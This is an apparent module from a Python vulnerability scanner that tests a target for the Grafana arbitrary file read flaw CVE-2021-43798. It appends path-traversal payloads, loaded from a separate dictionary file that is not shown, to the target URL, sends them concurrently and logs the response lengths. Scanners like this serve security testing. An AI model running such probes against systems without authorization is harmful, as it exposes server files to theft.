#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
from rich.progress import Progress
from concurrent.futures import ThreadPoolExecutor,wait,as_completed
urllib3.disable_warnings()
class Cve_2021_43798:
    def run(self,url):
        response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=5,proxies=self.proxy)
        if response.status_code == 200:
            OutPrintInfo("Grafana",f'Url:{url}')
            OutPrintInfo("Grafana",f'响应长度:{str(len(response.text))}')
        else:
            OutPrintInfo("Grafana",f'Url:{url}')
            OutPrintInfo("Grafana",f'响应长度:{str(len(response.text))}')
            OutPrintInfo("Grafana",f'响应码:{str(response.status_code)}')


    def main(self,target):
        OutPrintInfo("Grafana",'开始检测Grafana任意文件读取')
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        threads = int(target["threads"])

        self.headers, self.proxy = ReqSet(header=header, proxy=proxy)
        
        poc_list = []
        with open('./dict/grafana.txt','r') as f:
            for i in f:
                poc_list.append(i)
        with Progress(transient=True) as progress:
            tasks = progress.add_task("[b cyan]任务进行中...",total=len(poc_list))
            with ThreadPoolExecutor(int(threads)) as pool:
                futures = [pool.submit(self.run,url + poc.strip()) for poc in poc_list]
                for future in as_completed(futures):
                    future.result()
                    progress.update(tasks,advance=1)
            wait(futures)

        OutPrintInfo("Grafana",'Grafana任意文件读取检测结束')